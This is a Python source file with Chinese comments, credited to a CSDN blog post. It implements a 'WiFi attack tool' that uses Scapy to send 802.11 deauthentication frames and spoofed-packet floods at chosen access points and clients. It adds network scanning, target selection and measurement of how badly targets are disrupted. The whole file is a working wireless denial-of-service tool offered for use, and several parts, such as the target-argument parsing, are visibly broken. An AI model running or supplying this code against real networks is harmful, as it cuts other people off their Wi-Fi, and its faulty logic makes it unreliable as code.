# 以下代码实现来自：https://blog.csdn.net/qq_68809241/article/details/144328501
# 本文为CSDN博主「luky！」的原创文章，遵循CC 4.0 BY-SA版权协议

from scapy.all import *
import sys
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.http import HTTPRequest
import time
import logging
import argparse
import subprocess
import csv
import threading
import statistics

# 设置日志记录配置，将日志记录到当前目录下名为wifi_attack.log的文件中，日志级别为INFO
logging.basicConfig(filename='wifi_attack.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 发送deauth包的接口，比如你的无线网卡接口，通常是类似wlan0之类的，按需修改
interface = "wlan0"

# 用于记录发送数据包的总大小，单位为字节，初始化为0
total_sent_bytes = 0
# 用于记录每个目标发送数据包的大小列表，用于统计数据包大小分布等信息
target_sent_bytes = {}


def deauth_attack(targets, interval, duration, channel=None, verbose=False):
    """
    执行deauth攻击的函数

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx"}]
    :param interval: 发送每个deauth包的时间间隔（秒）
    :param duration: 攻击持续的总时长（秒），如果为None则持续发送直到手动停止
    :param channel: 要设置的无线信道，若为None则不进行信道设置，默认为None
    :param verbose: 是否详细打印每一次发送的信息，默认为False
    """
    global total_sent_bytes, target_sent_bytes
    try:
        if channel:
            set_channel(interface, channel)
        end_time = time.time() + duration if duration else None
        packet_count = 0
        for target in targets:
            target_bssid = target["bssid"]
            target_mac = target["mac"]
            dot11 = Dot11(addr1=target_mac, addr2=target_bssid, addr3=target_bssid)
            packet = RadioTap() / dot11 / Dot11Deauth()
            packet_size = len(packet)
            if target_mac not in target_sent_bytes:
                target_sent_bytes[target_mac] = []
            target_sent_bytes[target_mac].append(packet_size)
            i = 0
            while True:
                sendp(packet, iface=interface)
                total_sent_bytes += packet_size
                if verbose:
                    logging.info(f"已发送第 {i + 1} 个Deauth包至 {target_mac}，当前发送时间：{time.strftime('%Y-%m-%d %H:%M:%S')}")
                packet_count += 1
                i += 1
                if end_time and time.time() >= end_time:
                    break
                time.sleep(interval)
        return packet_count
    except Exception as e:
        logging.error(f"在执行Deauth攻击过程中出现错误: {str(e)}")
        raise


def normal_packet_attack(targets, interval, duration, channel=None, verbose=False):
    """
    模拟正常用户发包进行复杂攻击的函数，构造多种常见类型数据包模拟正常网络行为

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx"}]
    :param interval: 发送每个包的时间间隔（秒）
    :param duration: 攻击持续的总时长（秒），如果为None则持续送直到手动停止
    :param channel: 要设置的无线信道，若为None则不进行信道设置，默认为None
    :param verbose: 是否详细打印每一次发送的信息，默认为False
    """
    global total_sent_bytes, target_sent_bytes
    try:
        if channel:
            set_channel(interface, channel)
        end_time = time.time() + duration if duration else None
        packet_count = 0
        for target in targets:
            target_bssid = target["bssid"]
            target_mac = target["mac"]
            # 模拟HTTP请求包
            http_packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_bssid, addr3=target_bssid) / IP(dst="www.example.com") / TCP(dport=80) / HTTPRequest()
            # 模拟TCP连接包
            tcp_packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_bssid, addr3=target_bssid) / IP(dst="192.168.1.1") / TCP(dport=8080)
            # 模拟UDP数据包（示例，比如模拟DNS查询）
            udp_packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_bssid, addr3=target_bssid) / IP(dst="8.8.8.8") / UDP(dport=53)
            packets = [http_packet, tcp_packet, udp_packet]
            packet_size = len(random.choice(packets))
            if target_mac not in target_sent_bytes:
                target_sent_bytes[target_mac] = []
            target_sent_bytes[target_mac].append(packet_size)
            i = 0
            while True:
                packet = random.choice(packets)
                sendp(packet, iface=interface)
                total_sent_bytes += packet_size
                if verbose:
                    logging.info(f"已发送第 {i + 1} 个正常包至 {target_mac}，当前发送时间：{time.strftime('%Y-m-d %H:%M:%S')}")
                packet_count += 1
                i += 1
                if end_time and time.time() >= end_time:
                    break
                time.sleep(interval)
        return packet_count
    except Exception as e:
        logging.error(f"在执行正常包攻击过程中出现错误: {str(e)}")
        raise


def verify_attack_effect(targets, duration=10):
    """
    详细验证攻击效果，通过捕获目标MAC地址后续一段时间内的数据包情况来分析，统计丢包率等信息

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx"}]
    :param duration: 验证时长（秒），默认为10秒
    :return: 包含每个目标丢包率等信息的字典列表，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx", "packet_loss_rate": 0.5}]
    """
    results = []
    for target in targets:
        target_mac = target["mac"]
        sniff_filter = "ether host " + target_mac
        start_time = time.time()
        sent_packets = 0
        received_packets = 0
        try:
            for packet in sniff(iface=interface, filter=sniff_filter, timeout=duration):
                received_packets += 1
                if time.time() - start_time > duration:
                    break
            attack_type = "Deauth" if "Deauth" in globals() else "Normal"
            attack_func = deauth_attack if attack_type == "Deauth" else normal_packet_attack
            sent_packets = attack_func([target], 0, duration)
            packet_loss_rate = 1 - (received_packets / sent_packets) if sent_packets > 0 else 1
            results.append({"bssid": target["bssid"], "mac": target["mac"], "packet_loss_rate": packet_loss_rate})
        except Exception as e:
            logging.error(f"在验证攻击效果时出现错误: {str(e)}")
    return results


def set_channel(interface, channel):
    """
    设置无线网卡的信道
    :param interface: 无线网卡接口
    :param channel: 要设置的信道号
    """
    try:
        subprocess.check_call(["iwconfig", interface, "channel", str(channel)])
        logging.info(f"已成功将无线网卡 {interface} 设置到信道 {channel}")
    except subprocess.CalledProcessError as e:
        logging.error(f"设置无线网卡信道时出错: {str(e)}")


def scan_wifi_networks():
    """
    扫描周围的WiFi网络并列出基本信息（BSSID、SSID、信道、信号强度等）
    """
    try:
        scan_result = subprocess.check_output(["iwlist", interface, "scan"])
        scan_result = scan_result.decode('utf-8')
        bssids = []
        ssids = []
        channels = []
        signal_strengths = []
        for line in scan_result.splitlines():
            if "Address:" in line:
                bssids.append(line.split(":")[1].strip())
            elif "ESSID:" in line:
                ssids.append(line.split('"')[1])
            elif "Channel:" in line:
                channels.append(int(line.split(":")[1].strip()))
            elif "Quality=" in line:
                quality_info = line.split("=")[1].split(" ")
                signal_strength = int(quality_info[0].split("/")[0])
                signal_strengths.append(signal_strength)

        print("扫描到的WiFi网络信息如下：")
        for i in range(len(bssids)):
            print(f"BSSID: {bssids[i]}, SSID: {ssids[i]}, 信道: {channels[i]}, 信号强度: {signal_strengths[i]}")
    except subprocess.CalledProcessError as e:
        logging.error(f"扫描WiFi网络时出错: {str(e)}")


def save_attack_results(results, filename="attack_results.csv"):
    """
    将攻击结果保存到CSV文件中

    :param results: 攻击结果信息列表，每个元素是包含目标BSSID、目标MAC地址、丢包率等信息的字典
    :param filename: 保存结果的文件名，默认为attack_results.csv
    """
    fieldnames = ["BSSID", "MAC", "Packet Loss Rate"]
    try:
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for result in results:
                writer.writerow({"BSSID": result["bssid"], "MAC": result["mac"], "Packet Loss Rate": result["packet_loss_rate"]})
        logging.info(f"已成功将攻击结果保存到 {filename} 文件中。")
    except Exception as e:
        logging.error(f"保存攻击结果时出错: {str(e)}")


def show_attack_progress(targets, sent_packets, total_packets):
    """
    显示攻击进度信息

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典
    :param sent_packets: 已发送的数据包数量
    :param total_packets: 总共需要发送的数据包数量
    """
    progress = (sent_packets / total_packets) * 100
    print(f"攻击进度: {progress:.2f}%", end="\r")
    for target in targets:
        print(f"正在攻击目标: {target['mac']}（BSSID: {target['bssid']}）", end="\r")


def monitor_bandwidth(interval=1):
    """
    监测目标网络带宽占用情况的函数，每隔指定时间间隔统计一次发送的字节数来估算带宽

    :param interval: 统计带宽的时间间隔（秒），默认为1秒
    """
    global total_sent_bytes
    prev_bytes = 0
    while True:
        current_bytes = total_sent_bytes
        bandwidth = (current_bytes - prev_bytes) / interval
        logging.info(f"当前带宽占用情况: {bandwidth} 字节/秒")
        prev_bytes = current_bytes
        time.sleep(interval)


def filter_targets_by_signal_strength(targets, min_signal_strength):
    """
    根据信号强度自动筛选目标的函数

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx"}]
    :param min_signal_strength: 最小信号强度阈值，低于此阈值的目标将被过滤掉
    :return: 筛选后的目标信息列表
    """
    filtered_targets = []
    for target in targets:
        target_mac = target["mac"]
        sniff_filter = "ether host " + target_mac
        start_time = time.time()
        signal_strength = 0
        try:
            for packet in sniff(iface=interface, filter=sniff_filter, timeout=1):
                if "Quality=" in packet.summary():
                    quality_info = packet.summary().split("=")[1].split(" ")
                    signal_strength = int(quality_info[0].split("/")[0])
                    break
            if signal_strength >= min_signal_strength:
                filtered_targets.append(target)
        except Exception as e:
            logging.error(f"在获取目标信号强度时出现错误: {str(e)}")
    return filtered_targets


def visualize_traffic(targets, interval=5):
    """
    以复杂文本形式展示攻击流量大致情况，包括数据包大小分布、流量峰值等信息

    :param targets: 目标信息列表，每个元素是包含目标BSSID和目标MAC地址的字典，格式如[{"bssid": "xx:xx:xx:xx:xx:xx", "mac": "xx:xx:xx:xx:xx:xx"}]
    :param interval: 统计流量信息的时间间隔（秒），默认为5秒
    """
    start_time = time.time()
    peak_bandwidth = 0
    while True:
        current_time = time.time()
        if current_time - start_time >= interval:
            for target in targets:
                mac = target["mac"]
                packet_sizes = target_sent_bytes[mac]
                if packet_sizes:
                    mean_size = statistics.mean(packet_sizes)
                    std_dev_size = statistics.stdev(packet_sizes) if len(packet_sizes) > 1 else 0
                    logging.info(f"目标 {mac}（BSSID: {target['bssid']}）的数据包平均大小: {mean_size} 字节，标准差: {std_dev_size}")
                # 计算流量峰值
                bandwidth = sum(packet_sizes) / interval
                if bandwidth > peak_bandwidth:
                    peak_bandwidth = bandwidth
            logging.info(f"攻击流量峰值: {peak_bandwidth} 字节/秒")
            start_time = current_time
        time.sleep(0.1)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WiFi攻击工具')
    parser.add_argument('-t', '--targets', nargs='+', required=True, help='目标信息，格式为bssid:mac，多个目标用空格隔开，例如 xx:xx:xx:xx:xx:xx:xx:xx xx:xx:xx:xx:xx:xx:yy:yy')
    parser.add_argument('--interval', type=float, default=0.1, help='每个包的发送间隔（秒），默认为0.1秒')
    parser.add_argument('--duration', type=float, help='攻击持续的总时长（秒），如果不指定则持续发送直到手动停止')
    parser.add_argument('--channel', type=int, help='要设置的无线信道，若不指定则不进行信道设置')
    parser.add_argument('--attack_type', choices=["Deauth", "Normal"], default="Deauth", help='攻击类型，可选Deauth（去认证攻击）或Normal（模拟正常发包攻击），默认为Deauth')
    parser.add_argument('--verbose', action='store_true', help='详细打印每一次发送包的信息')
    parser.add_argument('--verify', action='store_true', help='是否验证攻击效果')
    parser.add_argument('--scan', action='store_true', help='是否扫描周围WiFi网络')
    parser.add_argument('--save', action='store_true', help='是否保存攻击结果到文件')
    parser.add_argument('--monitor_bandwidth', action='store_true', help='是否监测目标网络带宽占用情况')
    parser.add_argument('--min_signal_strength', type=int, help='筛选目标的最小信号强度阈值，低于此阈值的目标将被过滤掉')
    parser.add_argument('--visualize_traffic', action='store_true', help='是否以复杂文本形式展示攻击流量大致情况')

    args = parser.parse_args()

    targets = []
    for target_info in args.targets:
        bssid, mac = target_info.split(":")
        targets.append({"bssid": bssid, "mac": mac})

    if args.min_signal_strength:
        targets = filter_targets_by_signal_strength(targets, args.min_signal_strength)

    if args.scan:
        scan_wifi_networks()
    else:
        try:
            attack_func = deauth_attack if args.attack_type == "Deauth" else normal_packet_attack
            if args.duration:
                total_packets = int(args.duration / args.interval)
            else:
                total_packets = None
            sent_packets = 0
            start_time = time.time()
            monitor_thread = None
            visualize_thread = None
            if args.monitor_bandwidth:
                monitor_thread = threading.Thread(target=monitor_bandwidth)
                monitor_thread.start()
            if args.visualize_traffic:
                visualize_thread = threading.Thread(target=visualize_traffic, args=(targets,))
                visualize_thread.start()
            while True:
                sent_packets = attack_func(targets, args.interval, args.duration, args.channel, args.verbose)
                if args.duration and time.time() - start_time >= args.duration:
                    break
                if total_packets:
                    show_attack_progress(targets, sent_packets, total_packets)
            logging.info(f"{args.attack_type}攻击执行完毕，共发送 {sent_packets} 个包。")
            if args.verify:
                results = verify_attack_effect(targets)
                for result in results:
                    logging.info(f"目标 {result['mac']}（BSSID: {result['bssid']}）的丢包率为: {result['packet_loss_rate']}")
                if args.save:
                    save_attack_results(results)
            if monitor_thread:
                monitor_thread.join()
            if visualize_thread:
                visualize_thread.join()
        except Exception as e:
            logging.error(f"整体攻击执行失败，原因: {str(e)}")